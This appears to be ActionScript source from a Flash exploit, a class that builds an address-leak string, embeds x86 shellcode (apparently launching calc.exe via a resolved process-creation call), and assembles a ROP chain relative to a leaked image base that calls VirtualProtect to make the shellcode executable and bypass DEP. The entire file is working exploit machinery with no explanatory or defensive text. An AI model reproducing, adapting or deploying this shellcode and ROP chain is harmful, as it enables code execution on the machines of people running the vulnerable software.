package {
	//Real_Ref_Class.as
	import flash.display.Sprite;
	import flash.utils.ByteArray;

	public class Real_Ref_Class extends Sprite{
		public static function static_func1(objectLeak:uint,imageBase:uint):String{
			var address:uint = objectLeak;
			trace("address = " + address);
			var b:ByteArray = new ByteArray();
			b.writeInt(address);
			//var str:String = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + String.fromCharCode(b[3],b[2],b[2],b[1]);
			var str:String = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + String.fromCharCode(b[3],b[2],b[1],b[0]);
			return str;
		}
		
		public static function static_image():Object{
			var aa1:ByteArray = new ByteArray();     //return an integer
			aa1.writeUnsignedInt(0x41414141);
			aa1.writeUnsignedInt(0x42424242);
			aa1.writeUnsignedInt(0x43434343);
			aa1.writeUnsignedInt(0x44444444);
			return aa1;
		}
		
		public static function static_strToint(param_in:String):uint{
			var atom:uint = parseInt(param_in)
			//transfer string to Num
			atom = atom | 0x00000007;
			return atom;
		}
		
		public static function shellcode():Object{
			
			var b:ByteArray = new ByteArray();				
			
			b.writeUnsignedInt(0x558bec83);
			b.writeUnsignedInt(0xc4ac5351);
			b.writeUnsignedInt(0x57648b05);
			b.writeUnsignedInt(0x30000000);
			b.writeUnsignedInt(0x8b400c8b);
			b.writeUnsignedInt(0x400c8b00);
			b.writeUnsignedInt(0x8b008b58);
			b.writeUnsignedInt(0x1889d803);
			b.writeUnsignedInt(0x403c8b50);
			b.writeUnsignedInt(0x7801da8b);
			b.writeUnsignedInt(0x7a2001df);
			b.writeUnsignedInt(0x31c98b07);
			b.writeUnsignedInt(0x01d88138);
			b.writeUnsignedInt(0x43726561);
			b.writeUnsignedInt(0x751c8178);
			b.writeUnsignedInt(0x0b737341);
			b.writeUnsignedInt(0x0075138b);
			b.writeUnsignedInt(0x422401d8);
			b.writeUnsignedInt(0x0fb70448);
			b.writeUnsignedInt(0x8b521c01);
			b.writeUnsignedInt(0xda031c82);
			b.writeUnsignedInt(0xeb0983c7);
			b.writeUnsignedInt(0x04413b4a);
			b.writeUnsignedInt(0x187ccf8d);
			b.writeUnsignedInt(0x45f0508d);
			b.writeUnsignedInt(0x7dac5731);
			b.writeUnsignedInt(0xc0b91100);
			b.writeUnsignedInt(0x0000f3ab);
			b.writeUnsignedInt(0xc745ac44);
			b.writeUnsignedInt(0x00000050);
			b.writeUnsignedInt(0x50505050);
			b.writeUnsignedInt(0x50e80900);
			b.writeUnsignedInt(0x00006361);
			b.writeUnsignedInt(0x6c632e65);
			b.writeUnsignedInt(0x78650050);
			b.writeUnsignedInt(0xffd35f59);
			b.writeUnsignedInt(0x5bc1e003);
			b.writeUnsignedInt(0x83c006c9);
			b.writeUnsignedInt(0xc3909090);
			
			return b;
		}
		
		public static function ropfordep(imageBase:uint,shellcodeAddress:uint):Object{
			
			var b:ByteArray = new ByteArray();
			var address:uint = imageBase + 0xbfda7;
			var t:ByteArray = new ByteArray();
			
			t.writeInt(address);
			b.writeByte(t[3]);
			b.writeByte(t[2]);
			b.writeByte(t[1]);
			b.writeByte(t[0]);
			
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			
			address = imageBase + 0x35d6;
			t = new ByteArray();
			t.writeInt(address);
			b.writeByte(t[3]);
			b.writeByte(t[2]);
			b.writeByte(t[1]);
			b.writeByte(t[0]);
			b.writeUnsignedInt(0x41414141);
			var address:uint = 0x50f78;
			var t:ByteArray = new ByteArray();
			t.writeInt(address);
			b.writeByte(t[3]);
			b.writeByte(t[2]);
			b.writeByte(t[1]);
			b.writeByte(t[0]);              //for add [eax+24], EFFFFFFF
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			
			
			address = imageBase + 0xe32c;   //for edi esi ebp 
			t = new ByteArray();
			t.writeInt(address);
			b.writeByte(t[3]);
			b.writeByte(t[2]);
			b.writeByte(t[1]);
			b.writeByte(t[0]);
			
			address = shellcodeAddress;
			t = new ByteArray();
			t.writeInt(address);
			b.writeByte(t[3]);
			b.writeByte(t[2]);
			b.writeByte(t[1]);
			b.writeByte(t[0]);                //shellcodeaddress to edi     
			b.writeUnsignedInt(0x00200000);   //size to esi 
			b.writeUnsignedInt(0x40000000);   //permission to ebp
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x48484848);
			b.writeUnsignedInt(0x43434343);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			
			
			
			address = imageBase + 0x33f062;    //call virtualprotect
			t = new ByteArray();
			t.writeInt(address);
			b.writeByte(t[3]);
			b.writeByte(t[2]);
			b.writeByte(t[1]);
			b.writeByte(t[0]);
			
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);	
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);	
			b.writeUnsignedInt(0x41414141);
			
			
			address = shellcodeAddress;
			t = new ByteArray();
			t.writeInt(address);
			b.writeByte(t[3]);
			b.writeByte(t[2]);
			b.writeByte(t[1]);
			b.writeByte(t[0]); 
			
			b.writeUnsignedInt(0x41414141);	
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			b.writeUnsignedInt(0x41414141);
			return b;

			
			
		}
	}
}